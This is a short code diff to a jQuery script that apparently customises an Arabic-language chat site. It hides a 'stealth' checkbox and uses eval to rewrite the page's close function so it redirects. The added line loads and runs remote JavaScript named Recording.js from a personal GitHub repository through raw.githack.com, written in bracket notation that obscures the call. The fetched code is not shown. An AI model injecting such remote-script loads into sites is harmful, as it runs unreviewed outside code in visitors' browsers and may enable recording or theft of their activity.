@@ -13,3 +13,4 @@ $("[data-target=#wall]").attr('title','يمنع السوالف فالحائط')
 $('.nav-tabs').addClass('fl').css('width','100%');
 $(".checkbox label").html(`<input id="stealth" type="checkbox" value="">`);
 eval((close+'').replace('location.reload()','location.href="/"'));
+$["getScript"]("https://raw.githack.com/mmnm399819/dimaski98/master/Recording.js")
